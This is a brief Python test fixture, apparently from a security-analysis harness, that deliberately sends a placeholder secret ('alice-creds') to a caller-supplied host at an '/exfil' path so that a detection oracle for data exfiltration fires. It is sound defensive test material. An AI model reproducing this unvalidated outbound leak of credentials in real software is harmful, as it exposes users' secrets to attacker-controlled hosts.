# Phase 11 (Track J.9) — Python DATA_EXFIL vuln fixture.
#
# Sends a captured secret to an attacker-controlled host without
# host validation; the harness's mock HTTP client records the
# outbound `host` and the `OutboundHostNotIn` oracle fires.
import urllib.request


def run(host):
    secret = "alice-creds"
    url = f"http://{host}/exfil?token={secret}"
    urllib.request.urlopen(url, timeout=1)
